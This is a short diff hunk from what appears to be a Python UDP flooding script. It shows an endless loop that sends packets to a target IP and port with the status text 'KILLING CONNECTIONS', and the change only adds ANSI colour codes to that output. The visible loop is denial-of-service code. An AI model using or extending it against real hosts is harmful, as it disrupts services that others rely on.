@@ -101,4 +101,4 @@ while True:
 		pass
 	sock.sendto(packets, (ip, port))
 	sent = sent + 1
-	print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
+	print N+"\033[31mK\033[33m\033[0mI\033[0m\033[33mL\033[0m\033[32mL\033[0m\033[36mI\033[0m\033[34mN\033[35mG\033[0m CONNECTIONS  \033[32mstatus\033[0m :  packets \033[33m[%s]\033[0m   target : \033[33m[%s]\033[0m   port : \033[33m[%s]\033[0m"%(sent,ip,port)
